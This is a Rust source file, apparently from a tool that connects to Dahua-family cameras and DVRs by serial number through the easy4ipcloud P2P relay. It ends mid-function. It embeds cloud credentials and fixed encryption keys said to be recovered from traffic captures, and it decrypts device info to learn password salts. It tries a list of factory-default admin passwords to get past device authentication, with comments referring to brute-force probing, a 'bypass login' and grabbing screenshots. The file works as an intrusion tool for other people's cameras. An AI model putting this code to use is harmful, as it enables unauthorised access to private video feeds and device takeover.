use std::collections::HashMap;
use std::net::SocketAddrV4;
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Arc;
use std::time::{Duration, SystemTime, UNIX_EPOCH};

use aes::cipher::{BlockEncrypt, KeyInit};
use aes::{Aes256, Block};
use async_trait::async_trait;
use base64::Engine;
use chrono::Utc;
use hmac::{Hmac, Mac};
use pbkdf2::pbkdf2_hmac;
use sha1::Digest;
use sha2::Sha256;
use tokio::net::UdpSocket;
use tokio::sync::Mutex;
use tokio::time::timeout;

pub const MAIN_SERVER: &str = "www.easy4ipcloud.com:8800";
pub const USERNAME: &str = "cba1b29e32cb17aa46b8ff9e73c7f40b";
pub const USERKEY: &str = "996103384cdf19179e19243e959bbf8b";

/// Factory-default admin passwords (documented in Dahua manuals), used both for
/// DHIP bypass login (`--try-defaults`) and for the P2P channel DevAuth.
pub const DEFAULT_ADMIN_PASSWORDS: &[&str] =
    &["admin", "123456", "888888", "54321", "admin123", "12345"];

// The cloud encrypts the /info/device/{serial} payload with a fixed key and IV
// shared by every device (recovered from an easy4ipcloud capture).
const INFO_KEY: &[u8] = b"kRjmsUB&ezmdGLL67H#$ojw@XflcaIaf";
const INFO_IV: &[u8] = b"MydvJw*Iw1w&i^kk";
// IV used for the per-session LocalAddr encryption in the authenticated
// p2p-channel request.
const DEV_IV: &[u8] = b"2z52*lk9o6HRyJrf";

/// Set to true (e.g. via --verbose) to dump raw HTTP/PTCP exchange details.
pub static HTTP_DEBUG: AtomicBool = AtomicBool::new(false);

/// Set by `http_call` when a DISC status is received from the device on the current
/// channel. Callers should check this after `http_call` returns `None` to distinguish
/// an active disconnect from a timeout and abort early.
pub static LAST_CALL_DISC: AtomicBool = AtomicBool::new(false);

/// Returns true if the last `http_call` ended because the device sent a DISC status.
pub fn last_call_disc() -> bool {
    LAST_CALL_DISC.load(Ordering::Relaxed)
}

// ---- DH Response ----

#[derive(Debug)]
pub struct DHResponse {
    pub code: u16,
    pub status: String,
    pub body: Option<HashMap<String, String>>,
}

impl DHResponse {
    fn parse_body(body: &str) -> HashMap<String, String> {
        let mut parser = xml::reader::EventReader::from_str(body);
        let mut stack: Vec<String> = Vec::new();
        let mut tree = HashMap::new();
        loop {
            match parser.next() {
                Ok(xml::reader::XmlEvent::StartElement { name, .. }) => stack.push(name.local_name),
                Ok(xml::reader::XmlEvent::EndElement { .. }) => {
                    stack.pop();
                }
                Ok(xml::reader::XmlEvent::Characters(s)) => {
                    tree.insert(stack.join("/"), s);
                }
                Ok(xml::reader::XmlEvent::EndDocument) => break,
                Err(_) => break,
                _ => {}
            }
        }
        tree
    }

    pub fn parse_response(res: &str) -> Self {
        let mut parts = res.split("\r\n\r\n");
        let head = parts.next().unwrap_or("");
        let body = parts.next().unwrap_or("");

        let mut lines = head.split("\r\n");
        let status_line = lines.next().unwrap_or("");
        let mut status_parts = status_line.splitn(3, ' ');
        let _version = status_parts.next();
        let code: u16 = status_parts
            .next()
            .and_then(|c| c.parse().ok())
            .unwrap_or(0);
        let status = status_parts.next().unwrap_or("").to_string();

        let body = match body.trim().len() {
            0 => None,
            _ => Some(Self::parse_body(body)),
        };
        Self { code, status, body }
    }
}

// ---- P2P Client (simple probe for brute-force) ----

// ---- PTCP Protocol ----

#[derive(Debug)]
pub struct PTCPPayload {
    pub realm: u32,
    pub data: Vec<u8>,
}

impl PTCPPayload {
    pub fn parse(data: &[u8]) -> Self {
        // Defensive: short/malformed datagrams do arrive from some relays and
        // must never panic a batch run (seen in the field, 8-byte payloads).
        let realm = if data.len() >= 8 {
            u32::from_be_bytes([data[4], data[5], data[6], data[7]])
        } else {
            0
        };
        let start = 12.min(data.len());
        PTCPPayload {
            realm,
            data: data[start..].to_vec(),
        }
    }

    pub fn serialize(&self) -> Vec<u8> {
        let length = self.data.len() as u32;
        let header = (0x10000000 | length).to_be_bytes();
        let realm = self.realm.to_be_bytes();
        let padding = 0u32.to_be_bytes();
        [
            header.to_vec(),
            realm.to_vec(),
            padding.to_vec(),
            self.data.clone(),
        ]
        .concat()
    }
}

#[derive(Debug)]
pub enum PTCPBody {
    Sync,
    Command(Vec<u8>),
    Payload(PTCPPayload),
    Bind(u32, u32),
    Status(u32, String),
    Heartbeat,
    Empty,
}

impl PTCPBody {
    pub fn parse(data: &[u8]) -> Self {
        if data.is_empty() {
            return PTCPBody::Empty;
        }
        match data[0] {
            0x00 => PTCPBody::Sync,
            0x10 => PTCPBody::Payload(PTCPPayload::parse(data)),
            0x11 if data.len() >= 16 => PTCPBody::Bind(
                u32::from_be_bytes([data[4], data[5], data[6], data[7]]),
                u32::from_be_bytes([data[12], data[13], data[14], data[15]]),
            ),
            0x12 if data.len() >= 12 => {
                let realm = u32::from_be_bytes([data[4], data[5], data[6], data[7]]);
                let status = String::from_utf8_lossy(&data[12..]).to_string();
                PTCPBody::Status(realm, status)
            }
            0x13 => PTCPBody::Heartbeat,
            _ => PTCPBody::Command(data.to_vec()),
        }
    }

    pub fn serialize(&self) -> Vec<u8> {
        match self {
            PTCPBody::Sync => b"\x00\x03\x01\x00".to_vec(),
            PTCPBody::Command(data) => data.to_vec(),
            PTCPBody::Payload(p) => p.serialize(),
            PTCPBody::Bind(realm, port) => {
                let mut v = b"\x11\x00\x00\x00".to_vec();
                v.extend_from_slice(&realm.to_be_bytes());
                v.extend_from_slice(&[0u8; 4]);
                v.extend_from_slice(&port.to_be_bytes());
                v.extend_from_slice(&[127, 0, 0, 1]);
                v
            }
            PTCPBody::Status(realm, status) => {
                let mut v = b"\x12\x00\x00\x00".to_vec();
                v.extend_from_slice(&realm.to_be_bytes());
                v.extend_from_slice(&[0u8; 4]);
                v.extend_from_slice(status.as_bytes());
                v
            }
            PTCPBody::Heartbeat => b"\x13\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".to_vec(),
            PTCPBody::Empty => Vec::new(),
        }
    }

    pub fn len(&self) -> usize {
        match self {
            PTCPBody::Sync => 4,
            PTCPBody::Command(data) => data.len(),
            PTCPBody::Payload(p) => p.data.len() + 12,
            PTCPBody::Bind(_, _) => 20,
            PTCPBody::Status(_, s) => s.len() + 12,
            PTCPBody::Heartbeat => 12,
            PTCPBody::Empty => 0,
        }
    }
}

#[derive(Debug)]
pub struct PTCPPacket {
    pub sent: u32,
    pub recv: u32,
    pub pid: u32,
    pub lmid: u32,
    pub rmid: u32,
    pub body: PTCPBody,
}

impl PTCPPacket {
    pub fn parse(data: &[u8]) -> Self {
        // Defensive: datagrams shorter than the 24-byte PTCP header arrive from
        // some relays/devices; return an Empty packet instead of panicking.
        if data.len() < 24 {
            return PTCPPacket {
                sent: 0,
                recv: 0,
                pid: 0,
                lmid: 0,
                rmid: 0,
                body: PTCPBody::Empty,
            };
        }
        let sent = u32::from_be_bytes([data[4], data[5], data[6], data[7]]);
        let recv = u32::from_be_bytes([data[8], data[9], data[10], data[11]]);
        let pid = u32::from_be_bytes([data[12], data[13], data[14], data[15]]);
        let lmid = u32::from_be_bytes([data[16], data[17], data[18], data[19]]);
        let rmid = u32::from_be_bytes([data[20], data[21], data[22], data[23]]);
        let body = PTCPBody::parse(&data[24..]);
        PTCPPacket {
            sent,
            recv,
            pid,
            lmid,
            rmid,
            body,
        }
    }

    pub fn serialize(&self) -> Vec<u8> {
        let mut v = b"PTCP".to_vec();
        v.extend_from_slice(&self.sent.to_be_bytes());
        v.extend_from_slice(&self.recv.to_be_bytes());
        v.extend_from_slice(&self.pid.to_be_bytes());
        v.extend_from_slice(&self.lmid.to_be_bytes());
        v.extend_from_slice(&self.rmid.to_be_bytes());
        v.extend_from_slice(&self.body.serialize());
        v
    }
}

pub struct PTCPSession {
    pub sent: u32,
    pub recv: u32,
    pub count: u32,
    pub id: u32,
    pub rmid: u32,
}

impl PTCPSession {
    pub fn new() -> Self {
        PTCPSession {
            sent: 0,
            recv: 0,
            count: 0,
            id: 0,
            rmid: 0,
        }
    }

    pub fn send(&mut self, body: PTCPBody) -> PTCPPacket {
        let sent = self.sent;
        let recv = self.recv;
        let pid = match body {
            PTCPBody::Sync => 0x0002FFFF,
            _ => 0x0000FFFF - self.count,
        };
        let lmid = self.id;
        let rmid = self.rmid;
        self.sent += body.len() as u32;
        self.id += 1;
        self.count += match body {
            PTCPBody::Sync | PTCPBody::Empty | PTCPBody::Heartbeat => 0,
            _ => 1,
        };
        PTCPPacket {
            sent,
            recv,
            pid,
            lmid,
            rmid,
            body,
        }
    }

    pub fn recv(&mut self, packet: PTCPPacket) -> PTCPPacket {
        self.recv += packet.body.len() as u32;
        self.rmid = packet.lmid;
        packet
    }

    pub fn recv_only_bytes(&mut self, packet: &PTCPPacket) {
        self.recv += packet.body.len() as u32;
    }
}

// ---- UDP helpers ----

pub async fn udp_send(sock: &UdpSocket, buf: &[u8]) {
    let _ = sock.send(buf).await;
}

pub async fn udp_recv(sock: &UdpSocket, dur: Duration) -> Option<Vec<u8>> {
    let mut buf = [0u8; 4096];
    match timeout(dur, sock.recv(&mut buf)).await {
        Ok(Ok(n)) => Some(buf[..n].to_vec()),
        _ => None,
    }
}

pub async fn recv_until<F>(
    sock: &UdpSocket,
    session: &mut PTCPSession,
    timeout_dur: Duration,
    f: F,
) -> Option<PTCPPacket>
where
    F: Fn(&PTCPBody) -> bool,
{
    loop {
        let data = udp_recv(sock, timeout_dur).await?;
        if data.len() < 25 {
            continue;
        }
        let body = PTCPBody::parse(&data[24..]);

        if f(&body) {
            return Some(PTCPPacket::parse(&data));
        }

        let pkt = PTCPPacket::parse(&data);
        session.recv(pkt);

        if matches!(&body, PTCPBody::Empty) {
            udp_send(sock, &session.send(PTCPBody::Empty).serialize()).await;
        }
    }
}

// ---- Authenticated P2P channel (DevAuth / IpEncrptV2) ----

/// AES-256-OFB encrypt or decrypt in place (OFB is symmetric).
fn aes_ofb_apply(key: &[u8], iv: &[u8], data: &[u8]) -> Vec<u8> {
    let cipher = Aes256::new_from_slice(key).expect("AES key");
    let mut keystream = Block::clone_from_slice(iv);
    let mut out = Vec::with_capacity(data.len());
    for chunk in data.chunks(16) {
        cipher.encrypt_block(&mut keystream);
        for (i, b) in chunk.iter().enumerate() {
            out.push(b ^ keystream[i]);
        }
    }
    out
}

/// Decrypt the <Info> payload of /info/device/{serial} into JSON.
/// Returns the device salt and service ports, e.g.
/// {"httpport": 80, "privport": 37777, "randsalt": "...", "rtspport": 554}.
fn decrypt_device_info(enc_b64: &str) -> Option<serde_json::Value> {
    let data = base64::engine::general_purpose::STANDARD
        .decode(enc_b64)
        .ok()?;
    let dec = aes_ofb_apply(INFO_KEY, INFO_IV, &data);
    serde_json::from_slice(&dec).ok()
}

/// Look for a <RandSalt> element inside an error response body (the DH/XML map
/// keys are the dotted XML paths). Used when the anonymous /info/device did not
/// expose the salt but the refused channel response still carries it.
fn randsalt_from_err_body(body: &HashMap<String, String>) -> Option<String> {
    for (k, v) in body {
        if k == "RandSalt" || k.ends_with("/RandSalt") {
            let s = v.trim();
            if !s.is_empty() {
                return Some(s.to_string());
            }
        }
    }
    None
}

/// Device auth key: MD5("{user}:Login to {randsalt}:{password}") uppercase hex
/// as bytes — the same HA1 realm format used elsewhere.
fn p2p_auth_key(user: &str, password: &str, randsalt: &str) -> Vec<u8> {
    let s = format!("{}:Login to {}:{}", user, randsalt, password);
    hex::encode_upper(md5::compute(s.as_bytes()).as_ref()).into_bytes()
}

fn derive_session_key(key: &[u8], nonce: u32) -> [u8; 32] {
    let mut dk = [0u8; 32];
    pbkdf2_hmac::<Sha256>(key, nonce.to_string().as_bytes(), 20000, &mut dk);
    dk
}

/// Encrypt the LocalAddr for the authenticated p2p-channel request.
fn encrypt_local_addr(key: &[u8], nonce: u32, laddr: &str) -> String {
    let dk = derive_session_key(key, nonce);
    let enc = aes_ofb_apply(&dk, DEV_IV, laddr.as_bytes());
    base64::engine::general_purpose::STANDARD.encode(&enc)
}

/// Build the <CreateDate>/<DevAuth>/<Nonce>/<RandSalt>/<UserName> XML snippet.
fn build_dev_auth(key: &[u8], user: &str, nonce: u32, randsalt: &str, payload: &str) -> String {
    let curdate = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .map(|d| d.as_secs())
        .unwrap_or(0);
    build_dev_auth_at(key, user, nonce, randsalt, payload, curdate)
}

fn build_dev_auth_at(
    key: &[u8],
    user: &str,
    nonce: u32,
    randsalt: &str,
    payload: &str,
    curdate: u64,
) -> String {
    let message = format!("{}{}{}", nonce, curdate, payload);
    let mut mac = <Hmac<Sha256> as Mac>::new_from_slice(key).expect("HMAC key");
    mac.update(message.as_bytes());
    let digest = mac.finalize().into_bytes();
    let auth = base64::engine::general_purpose::STANDARD.encode(&digest);
    let salt = if randsalt.is_empty() {
        String::new()
    } else {
        format!("<RandSalt>{}</RandSalt>", randsalt)
    };
    format!(
        "<CreateDate>{}</CreateDate><DevAuth>{}</DevAuth><Nonce>{}</Nonce>{}<UserName>{}</UserName>",
        curdate, auth, nonce, salt, user
    )
}

// ---- P2P Handshake (full, for screenshots) ----

pub struct HandshakeResult {
    pub device_socket: Arc<UdpSocket>,
    pub device_session: Arc<Mutex<PTCPSession>>,
    pub agent_socket: Arc<UdpSocket>,
    pub agent_session: Arc<Mutex<PTCPSession>>,
    /// Public IP of the device as reported by the relay in `body/PubAddr`.
    pub device_public_ip: String,
}

pub async fn p2p_handshake(
    serial: &str,
    relay_mode: bool,
    admin_user: &str,
    admin_pass: &str,
    try_defaults: bool,
) -> Result<HandshakeResult, String> {
    let mut cseq = 0u32;

    let socket = UdpSocket::bind("0.0.0.0:0")
        .await
        .map_err(|e| format!("bind error: {}", e))?;
    socket
        .connect(MAIN_SERVER)
        .await
        .map_err(|e| format!("connect to main server: {}", e))?;

    // Probe p2psrv
    socket.dh_request("/probe/p2psrv", None, &mut cseq).await?;
    let probe = socket.dh_read_raw_timeout(Duration::from_secs(8)).await;
    if probe.code >= 400 {
        return Err(format!(
            "P2P server probe failed: {} {}",
            probe.code, probe.status
        ));
    }

    // Lookup p2psrv
    socket
        .dh_request(&format!("/online/p2psrv/{}", serial), None, &mut cseq)
        .await?;
    let online = socket.dh_read_raw_timeout(Duration::from_secs(8)).await;
    if online.code >= 400 {
        return Err(format!(
            "P2P lookup failed: {} {}",
            online.code, online.status
        ));
    }
    let p2psrv = match online.body {
        Some(ref b) => b.get("body/US").cloned().unwrap_or_default(),
        None => return Err(format!("No response for /online/p2psrv/{}", serial)),
    };
    if p2psrv.is_empty() {
        return Err(format!(
            "Device {} not found on P2P server (empty US)",
            serial
        ));
    }
    if HTTP_DEBUG.load(Ordering::Relaxed) {
        eprintln!("[debug] p2psrv: {}", p2psrv);
    }

    // Get relay
    socket.dh_request("/online/relay", None, &mut cseq).await?;
    let relay_resp = socket.dh_read_raw_timeout(Duration::from_secs(8)).await;
    let relay = match relay_resp.body {
        Some(ref b) => b.get("body/Address").cloned().unwrap_or_default(),
        None => return Err("No response for /online/relay".to_string()),
    };
    if HTTP_DEBUG.load(Ordering::Relaxed) {
        eprintln!("[debug] relay: {}", relay);
    }

    // Probe device
    let socket2 = UdpSocket::bind("0.0.0.0:0")
        .await
        .map_err(|e| format!("bind socket2: {}", e))?;
    socket2
        .connect(&p2psrv)
        .await
        .map_err(|e| format!("connect to p2psrv: {}", e))?;
    socket2
        .dh_request(&format!("/probe/device/{}", serial), None, &mut cseq)
        .await?;
    let probe_resp = socket2.dh_read_raw_timeout(Duration::from_secs(8)).await;
    if probe_resp.code >= 400 {
        return Err(format!(
            "Device {} not reachable (HTTP {} {})",
            serial, probe_resp.code, probe_resp.status
        ));
    }

    // Query device info to learn the password salt (newer firmware requires it
    // when opening an authenticated P2P channel).
    let mut randsalt = String::new();
    socket2
        .dh_request(&format!("/info/device/{}", serial), None, &mut cseq)
        .await?;
    let info_resp = socket2.dh_read_raw_timeout(Duration::from_secs(8)).await;
    if HTTP_DEBUG.load(Ordering::Relaxed) {
        eprintln!(
            "[debug] /info/device response: {} {} body={:?}",
            info_resp.code, info_resp.status, info_resp.body
        );
    }
    if info_resp.code < 400 {
        if let Some(info_b64) = info_resp.body.and_then(|b| b.get("body/Info").cloned()) {
            if let Some(info) = decrypt_device_info(&info_b64) {
                if HTTP_DEBUG.load(Ordering::Relaxed) {
                    eprintln!("[debug] decrypted device info: {:?}", info);
                }
                if let Some(s) = info.get("randsalt").and_then(|v| v.as_str()) {
                    randsalt = s.to_string();
                }
            } else if HTTP_DEBUG.load(Ordering::Relaxed) {
                eprintln!("[debug] failed to decrypt device info");
            }
        }
    }
    if HTTP_DEBUG.load(Ordering::Relaxed) {
        eprintln!("[debug] device randsalt: {}", randsalt);
    }

    // Open P2P channel
    let cid: [u8; 8] = rand::random();
    let cid_hex: Vec<String> = cid.iter().map(|b| format!("{:x}", b)).collect();

    socket
        .dh_request(
            &format!("/device/{}/p2p-channel", serial),
            Some(&format!(
                "<body><Identify>{}</Identify><IpEncrpt>true</IpEncrpt><LocalAddr>127.0.0.1:{}</LocalAddr><version>5.0.0</version></body>",
                cid_hex.join(" "),
                socket.local_addr().unwrap().port(),
            )),
            &mut cseq,
        )
        .await?;

    // Relay agent
    socket2
        .connect(&relay)
        .await
        .map_err(|e| format!("connect to relay: {}", e))?;
    socket2.dh_request("/relay/agent", None, &mut cseq).await?;
    let agent_resp = socket2.dh_read_raw_timeout(Duration::from_secs(8)).await;
    if agent_resp.code >= 400 {
        return Err(format!(
            "Relay agent error: {} {}",
            agent_resp.code, agent_resp.status
        ));
    }
    let data = match agent_resp.body {
        Some(b) => b,
        None => return Err("No response for /relay/agent".to_string()),
    };
    let token = data.get("body/Token").cloned().unwrap_or_default();
    let mut agent = data.get("body/Agent").cloned().unwrap_or_default();
    if HTTP_DEBUG.load(Ordering::Relaxed) {
        eprintln!("[debug] relay token: {} agent: {}", token, agent);
    }

    socket2
        .connect(&agent)
        .await
        .map_err(|e| format!("connect to agent: {}", e))?;
    socket2
        .dh_request(
            &format!("/relay/start/{}", token),
            Some("<body><Client>:0</Client></body>"),
            &mut cseq,
        )
        .await?;
    let start_resp = socket2.dh_read_raw_timeout(Duration::from_secs(8)).await;
    if start_resp.code >= 400 {
        return Err(format!(
            "Relay start error: {} {}",
            start_resp.code, start_resp.status
        ));
    }

    // Wait for device channel
    let mut res = socket.dh_read_raw_timeout(Duration::from_secs(15)).await;
    // Some firmware/firmware variants refuse the anonymous channel with 403
    // OR 401. When the salt is not known, try to recover it from the channel
    // error body (the relay may echo <RandSalt> in the DevPwd_InvalidSalt case).
    let requires_auth = matches!(res.code, 401 | 403);
    if requires_auth && randsalt.is_empty() {
        if let Some(b) = &res.body {
            if let Some(s) = randsalt_from_err_body(b) {
                if HTTP_DEBUG.load(Ordering::Relaxed) {
                    eprintln!("[debug] randsalt from channel error body: {}", s);
                }
                randsalt = s;
            }
        }
    }
    let mut auth_key: Option<Vec<u8>> = None;
    if requires_auth && !randsalt.is_empty() {
        // Retry with the authenticated DevAuth/IpEncrptV2 channel using device
        // credentials: the explicit --admin-pass first, then the factory default
        // passwords when --try-defaults is set.
        eprintln!(
            "[debug] P2P channel requires auth ({}); retrying with device credentials",
            res.code
        );
        let mut passwords: Vec<&str> = Vec::new();
        if !admin_pass.is_empty() {
            passwords.push(admin_pass);
        }
        if try_defaults {
            passwords.extend(DEFAULT_ADMIN_PASSWORDS);
        }
        for pw in passwords {
            let key = p2p_auth_key(admin_user, pw, &randsalt);
            let nonce: u32 = rand::random();
            let laddr = format!("127.0.0.1:{}", socket.local_addr().unwrap().port());
            let enc_laddr = encrypt_local_addr(&key, nonce, &laddr);
            let auth_xml = build_dev_auth(&key, admin_user, nonce, &randsalt, &enc_laddr);
            let body = format!(
                "<body>{auth_xml}<Identify>{}</Identify><IpEncrptV2>true</IpEncrptV2><LocalAddr>{}</LocalAddr><version>5.0.0</version></body>",
                cid_hex.join(" "),
                enc_laddr
            );
            socket
                .dh_request(
                    &format!("/device/{}/p2p-channel", serial),
                    Some(&body),
                    &mut cseq,
                )
                .await?;
            res = socket.dh_read_raw_timeout(Duration::from_secs(15)).await;
            if res.code == 100 {
                res = socket.dh_read_raw_timeout(Duration::from_secs(15)).await;
            }
            if res.code < 400 {
                auth_key = Some(key);
                if try_defaults && pw != admin_pass {
                    println!("  [i] P2P channel auth OK with default password '{}'", pw);
                }
                break;
            }
            if HTTP_DEBUG.load(Ordering::Relaxed) {
                eprintln!(
                    "[debug] DevAuth with '{}' failed: {} {}",
                    pw, res.code, res.status
                );
            }
        }
    }
    if HTTP_DEBUG.load(Ordering::Relaxed) {
        eprintln!(
            "[debug] p2p-channel response: {} {} body={:?}",
            res.code, res.status, res.body
        );
    }
    if res.code >= 400 {
        if HTTP_DEBUG.load(Ordering::Relaxed) {
            eprintln!("[debug] p2p-channel auth'd response body: {:?}", res.body);
        }
        let hint = if randsalt.is_empty() {
            " (no device salt available — firmware may need --admin-pass)"
        } else if !admin_pass.is_empty() {
            " — check --admin-user/--admin-pass credentials"
        } else {
            " — retry with --admin-pass or --try-defaults"
        };
        return Err(format!(
            "P2P channel error: {} {}{}",
            res.code, res.status, hint
        ));
    }
    let resp_body = match res.body {
        Some(b) => b,
        None => return Err("No body in P2P channel response".to_string()),
    };
    let device_pub = resp_body.get("body/PubAddr").cloned().unwrap_or_default();
    if device_pub.is_empty() {
        return Err("Device PubAddr is empty — device may be offline".to_string());
    }

    socket
        .connect(&device_pub)
        .await
        .map_err(|e| format!("connect to device {}: {}", device_pub, e))?;

    // Relay channel — try the main server first, then the device's own p2psrv
    // and the relay server (some device families, e.g. China-market DVRs, only
    // honour the relay-channel when it is sent to the server that actually
    // hosts the device's channel). The "Server Nat Info!" response can arrive
    // either from the server we sent the request to or from the agent.
    let rc_body = if let Some(key) = &auth_key {
        let nonce2: u32 = rand::random();
        let auth_xml = build_dev_auth(key, admin_user, nonce2, &randsalt, "");
        format!("<body>{auth_xml}<agentAddr>{}</agentAddr></body>", agent)
    } else {
        format!("<body><agentAddr>{}</agentAddr></body>", agent)
    };
    let mut relay_ok = false;
    for target in [MAIN_SERVER.to_string(), p2psrv.clone()] {
        socket2
            .connect(&target)
            .await
            .map_err(|e| format!("reconnect socket2 to {}: {}", target, e))?;
        socket2
            .dh_request(
                &format!("/device/{}/relay-channel", serial),
                Some(&rc_body),
                &mut cseq,
            )
            .await?;
        // The "Server Nat Info!" response is relayed by the agent, so point the
        // socket at the agent right after sending: on a connected UDP socket the
        // kernel drops datagrams from any other address.
        socket2
            .connect(&agent)
            .await
            .map_err(|e| format!("reconnect socket2 to agent: {}", e))?;
        // The server first answers "100 Trying", then the final
        // "200 Server Nat Info!" once the device has connected to the agent.
        let mut rc_resp = socket2.dh_read_raw_timeout(Duration::from_secs(10)).await;
        if rc_resp.code == 100 {
            rc_resp = socket2.dh_read_raw_timeout(Duration::from_secs(10)).await;
        }
        if HTTP_DEBUG.load(Ordering::Relaxed) {
            eprintln!(
                "[debug] relay-channel via {} response: {} {} {:?}",
                target, rc_resp.code, rc_resp.status, rc_resp.body
            );
        }
        if rc_resp.code >= 200 && rc_resp.code < 400 {
            relay_ok = true;
            break;
        }
    }
    if !relay_ok {
        // Some infrastructures answer the relay-channel directly on the relay
        // server (usually 400 for this client, but never hurts to ask).
        socket2
            .connect(&relay)
            .await
            .map_err(|e| format!("reconnect socket2 to relay: {}", e))?;
        socket2
            .dh_request(
                &format!("/device/{}/relay-channel", serial),
                Some(&rc_body),
                &mut cseq,
            )
            .await?;
        let mut rc_resp = socket2.dh_read_raw_timeout(Duration::from_secs(5)).await;
        if rc_resp.code == 100 {
            rc_resp = socket2.dh_read_raw_timeout(Duration::from_secs(5)).await;
        }
        if HTTP_DEBUG.load(Ordering::Relaxed) {
            eprintln!(
                "[debug] relay-channel via {} response: {} {} {:?}",
                relay, rc_resp.code, rc_resp.status, rc_resp.body
            );
        }
        if rc_resp.code >= 200 && rc_resp.code < 400 {
            relay_ok = true;
        }
    }

    let mut used_mcw0 = false;
    if !relay_ok {
        // mcw0-style fallback: instead of a separate relay-channel, bake the
        // agent address into a fresh p2p-channel request so the device is told
        // to reach us through the agent directly. The "200 Server Nat Info!"
        // response on the p2p-channel socket confirms the tunnel.
        if HTTP_DEBUG.load(Ordering::Relaxed) {
            eprintln!(
                "[debug] relay-channel timed out everywhere; trying mcw0-style agent PubAddr channel"
            );
        }
        // The relay session from /relay/start only lasts ~30s and the
        // relay-channel attempts above consumed most of it, so re-establish it
        // with a fresh agent before the mcw0-style channel.
        if HTTP_DEBUG.load(Ordering::Relaxed) {
            eprintln!("[debug] refreshing relay session for mcw0-style channel");
        }
        socket2
            .connect(&relay)
            .await
            .map_err(|e| format!("reconnect socket2 to relay for refresh: {}", e))?;
        socket2.dh_request("/relay/agent", None, &mut cseq).await?;
        let refresh_agent = socket2.dh_read_raw_timeout(Duration::from_secs(8)).await;
        if refresh_agent.code >= 400 {
            return Err(format!(
                "Relay agent refresh error: {} {}",
                refresh_agent.code, refresh_agent.status
            ));
        }
        let token2 = refresh_agent
            .body
            .as_ref()
            .and_then(|b| b.get("body/Token"))
            .cloned()
            .unwrap_or_default();
        let agent2 = refresh_agent
            .body
            .as_ref()
            .and_then(|b| b.get("body/Agent"))
            .cloned()
            .unwrap_or_default();
        if agent2.is_empty() {
            return Err("No agent for refreshed relay session".to_string());
        }
        if HTTP_DEBUG.load(Ordering::Relaxed) {
            eprintln!(
                "[debug] refreshed relay token: {} agent: {}",
                token2, agent2
            );
        }
        socket2
            .connect(&agent2)
            .await
            .map_err(|e| format!("connect socket2 to refreshed agent: {}", e))?;
        socket2
            .dh_request(
                &format!("/relay/start/{}", token2),
                Some("<body><Client>:0</Client></body>"),
                &mut cseq,
            )
            .await?;
        let start_resp2 = socket2.dh_read_raw_timeout(Duration::from_secs(8)).await;
        if start_resp2.code >= 400 {
            return Err(format!(
                "Relay start refresh error: {} {}",
                start_resp2.code, start_resp2.status
            ));
        }
        agent = agent2;
        for target in [MAIN_SERVER, p2psrv.as_str()] {
            socket
                .connect(target)
                .await
                .map_err(|e| format!("reconnect socket to {}: {}", target, e))?;
            socket
                .dh_request(
                    &format!("/device/{}/p2p-channel", serial),
                    Some(&format!(
                        "<body><Identify>0 0 0 0 0 0 0 0</Identify><PubAddr>{}</PubAddr></body>",
                        agent
                    )),
                    &mut cseq,
                )
                .await?;
            // The server first answers "100 Trying", then sends the "200 Server
            // Nat Info!" once the device has connected to the agent.
            let mut mcw_resp = socket.dh_read_raw_timeout(Duration::from_secs(15)).await;
            if mcw_resp.code == 100 {
                mcw_resp = socket.dh_read_raw_timeout(Duration::from_secs(15)).await;
            }
            if HTTP_DEBUG.load(Ordering::Relaxed) {
                eprintln!(
                    "[debug] mcw0-style p2p-channel via {} response: {} {} {:?}",
                    target, mcw_resp.code, mcw_resp.status, mcw_resp.body
                );
            }
            if mcw_resp.code >= 200 && mcw_resp.code < 400 {
                used_mcw0 = true;
                break;
            }
            if HTTP_DEBUG.load(Ordering::Relaxed) {
                eprintln!(
                    "[debug] mcw0-style channel via {} failed ({} {}), next target",
                    target, mcw_resp.code, mcw_resp.status
                );
            }
        }
        if !used_mcw0 {
            return Err("Relay channel timed out and mcw0-style channel failed".to_string());
        }
    }

    if used_mcw0 {
        // mcw0-style channels need a short STUN exchange with the agent before
        // the agent relays data: the agent forwards the device's
        // BINDING_REQUEST_SIGN (0x00 0x01); answering with
        // BINDING_RESPONSE_SUCCESS (0x01 0x01) + transaction id completes the
        // NAT mapping on the agent.
        socket2
            .connect(&agent)
            .await
            .map_err(|e| format!("connect socket2 to agent for STUN: {}", e))?;
        if HTTP_DEBUG.load(Ordering::Relaxed) {
            eprintln!("[debug] waiting for agent STUN BINDING_REQUEST_SIGN");
        }
        let deadline = tokio::time::Instant::now() + Duration::from_secs(15);
        loop {
            let remaining = deadline.saturating_duration_since(tokio::time::Instant::now());
            if remaining.is_zero() {
                if HTTP_DEBUG.load(Ordering::Relaxed) {
                    eprintln!("[debug] STUN BINDING_REQUEST_SIGN timed out");
                }
                break;
            }
            // The device punch can be relayed to us either on the agent socket
            // or back through the main server, so poll both (mcw0 handles STUN
            // on the p2p-channel socket too).
            let from_srv = udp_recv(&socket, remaining);
            let from_agent = udp_recv(&socket2, remaining);
            let (opt, from) = tokio::select! {
                d = from_srv => (d, "main-server socket"),
                d = from_agent => (d, "agent socket"),
            };
            let data = match opt {
                Some(d) => d,
                None => break,
            };
            if HTTP_DEBUG.load(Ordering::Relaxed) {
                eprintln!(
                    "[debug] STUN-phase recv on {} ({} bytes): {:02x?}",
                    from,
                    data.len(),
                    &data[..data.len().min(64)]
                );
            }
            if data.len() >= 32 && data[0] == 0x00 && data[1] == 0x01 {
                let mut reply = vec![0x01, 0x01];
                reply.extend_from_slice(&data[2..24]);
                reply.extend_from_slice(&[0u8; 8]);
                reply.extend_from_slice(&data[32..]);
                if HTTP_DEBUG.load(Ordering::Relaxed) {
                    eprintln!(
                        "[debug] replying STUN BINDING_RESPONSE_SUCCESS ({} bytes)",
                        reply.len()
                    );
                }
                udp_send(&socket2, &reply).await;
                // Drain a possible follow-up response (like mcw0 does).
                let _ = udp_recv(&socket2, Duration::from_secs(2)).await;
                break;
            }
        }
    }

    // PTCP Sync with agent
    let mut agent_session = PTCPSession::new();
    udp_send(&socket2, &agent_session.send(PTCPBody::Sync).serialize()).await;
    let sync_data = udp_recv(&socket2, Duration::from_secs(10))
        .await
        .ok_or("Timeout waiting for PTCP Sync from agent".to_string())?;
    agent_session.recv(PTCPPacket::parse(&sync_data));

    if relay_mode {
        return Ok(HandshakeResult {
            device_socket: Arc::new(socket),
            device_session: Arc::new(Mutex::new(PTCPSession::new())),
            agent_socket: Arc::new(socket2),
            agent_session: Arc::new(Mutex::new(agent_session)),
